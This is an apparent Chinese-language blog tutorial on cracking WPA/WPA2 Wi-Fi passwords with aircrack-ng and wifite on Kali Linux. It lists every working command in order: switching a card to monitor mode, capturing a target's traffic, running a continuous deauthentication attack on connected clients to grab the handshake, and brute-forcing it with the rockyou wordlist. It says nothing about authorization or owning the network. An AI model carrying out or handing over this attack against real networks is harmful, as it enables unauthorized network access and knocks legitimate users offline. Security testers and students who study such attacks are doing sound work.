利用aircrack-ng/wifite破解wifi密码

发表于2023-03-05|更新于2023-03-05|分享
|字数总计:566|阅读时长:1分钟|阅读量:

前提准备

  • 一块有监听功能的网卡
  • kali虚拟机

Aircrack-ng

1.挂载网卡

2.查看网卡信息

3.启动网卡监听

wlan0是我的网卡，可以看到此时网卡的Mode（模式）是Managed模式，输入下列命令将其切换为监听模式

airmon-ng start wlan0

再次查看网卡信息可以看到Mode变为Monitor（监听）模式

此时我们原来的wlan0通常会随模式的切换而被自动更名为wlan0mon

是否会自动更名与网卡型号有关，我用的8812AU网卡没有自动更名，如果你的网卡更名，那么下面的命令记得将wlan0改为wlan0mon

4.扫描周围无线网络

输入下列命令会得到一个不断刷新的表格

  • BSSID代表路由器的 MAC 地址
  • PWR 代表信号的强度，数值越大代表信息越强
  • CH 代表信道（注意）
  • ENC代表用的加密的方式（aircrack-ng只能破解WPA/WPA2）
  • AUTH 代表认证的方式
  • ESSID是WIFI的名字

airodump-ng wlan0mon

5.监听目标流量

airodump-ng -w 保存路径 -c 信道 --bssid BSSID wlan0mon

这里可以看到连接了某WIFI的客户端的MAC地址

6.攻击客户端

重新打开一个命令行，攻击客户端

aireplay-ng -0 0 -a 你要打的WIFI的MAC地址 -c 客户端MAC地址 wlan0

-0是攻击次数，0表示一直攻击

出现 WPA handshake: WIFI的MAC地址表示获取握手包成功

7.暴力破解

第五步保存路径中.cap后缀的文件是我们需要的，配合密码字典进行暴力破解

kali内置无线密码字典目录

/usr/share/wordlists/rockyou.txt.gz

解压

gzip -d rockyou.txt.gz

执行破解命令

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b WIFI的MAC地址 xxx.cap

Wifite

wifite是kali内置的基于aircrack-ng实现自动化破解的脚本

wifite --dict 字典文件 --kill

也可以不指定字典文件，wifite默认使用有相应的字典，–kill是关闭冲突的进程，可选

WPS栏为yes表示可以破解，CLIENT是连接数目，PWR表示信号强弱

确定好目标后按下ctrl+c，然后输入NUM栏的序号进行破解

破解成功
